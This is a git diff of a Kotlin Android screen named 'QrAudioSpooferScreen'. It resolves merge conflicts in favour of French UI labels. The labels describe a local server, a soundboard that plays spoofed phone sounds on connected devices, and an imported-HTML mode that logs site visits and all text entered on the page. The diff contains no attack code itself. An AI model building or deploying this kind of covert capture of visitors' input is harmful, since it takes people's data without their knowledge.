@@ -455,11 +455,7 @@ fun QrAudioSpooferScreen(
         val s = serverIp!!
         if (s.startsWith("http://")) s else "http://$s"
     } else if (isStarted) {
-<<<<<<< HEAD
         "Démarrage du serveur local…"
-=======
-        "Starting local server…"
->>>>>>> upstream/main
     } else {
         "En attente…"
     }
@@ -641,13 +637,8 @@ fun QrAudioSpooferScreen(
             if (isCustomHtml) {
                 Spacer(modifier = Modifier.height(12.dp))
                 Text(
-<<<<<<< HEAD
                     "Mode HTML importé : journaux uniquement. Contrôle audio masqué. " +
                         "Dans les journaux : visites du site et saisies sur la page.",
-=======
-                    "Imported style: logs only. Audio controls are hidden. " +
-                        "Logs show site visits and all text entered on the page.",
->>>>>>> upstream/main
                     color = MaterialTheme.colorScheme.onSurfaceVariant,
                     fontSize = 12.sp,
                     modifier = Modifier.fillMaxWidth()
@@ -657,11 +648,7 @@ fun QrAudioSpooferScreen(
                     onClick = { htmlPickerLauncher.launch("*/*") },
                     modifier = Modifier.fillMaxWidth()
                 ) {
-<<<<<<< HEAD
                     Text("Remplacer le fichier HTML")
-=======
-                    Text("Replace HTML")
->>>>>>> upstream/main
                 }
             }
 
@@ -671,11 +658,7 @@ fun QrAudioSpooferScreen(
 
             val deviceCount by viewModel.deviceCount.collectAsState()
             Text("SOUNDBOARD", color = MaterialTheme.colorScheme.onSurfaceVariant, fontSize = 12.sp, fontWeight = FontWeight.Bold, modifier = Modifier.fillMaxWidth())
-<<<<<<< HEAD
             Text("Connecté : $deviceCount appareils", color = accentColor, fontSize = 11.sp, modifier = Modifier.fillMaxWidth())
-=======
-            Text("Connected: $deviceCount devices", color = accentColor, fontSize = 11.sp, modifier = Modifier.fillMaxWidth())
->>>>>>> upstream/main
             Spacer(modifier = Modifier.height(8.dp))
             Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                 SoundButton("", Icons.Default.Message, accentColor) { viewModel.sendCommand("PLAY:iphone_message.mp3") }
@@ -750,11 +733,7 @@ fun QrAudioSpooferScreen(
 
 
             Text(
-<<<<<<< HEAD
                 if (isCustomHtml) "JOURNAUX DU SITE" else "TERMINAL LOGS",
-=======
-                if (isCustomHtml) "SITE LOGS" else "TERMINAL LOGS",
->>>>>>> upstream/main
                 color = MaterialTheme.colorScheme.onSurfaceVariant,
                 fontSize = 12.sp,
                 fontWeight = FontWeight.Bold,
